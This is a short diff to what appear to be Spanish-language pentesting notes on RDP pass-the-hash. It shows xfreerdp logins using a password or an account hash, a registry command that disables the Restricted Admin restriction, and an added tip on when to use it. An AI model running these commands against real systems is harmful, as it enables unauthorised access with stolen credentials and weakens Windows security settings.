@@ -9,6 +9,9 @@ xfreerdp /v:ip'/u:user /p:'psw'
 Sirve para conectarse con el hash de SAM del usuario. En el caso de que no te permita hacerlo se puede usar:
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 #Se ejecuta en el cmd windows para poder habilitar el DisableRstrictedAdmin en regedit y usar pass the hash
+[!]
+Usar cando sale el error "Acccount restrictions are preventing this user from signing in."
+[!]
 xfreerdp /v:ip'/u:user /pth:'hash'
 #Comando para conectarse con el hash de la cuenta
 
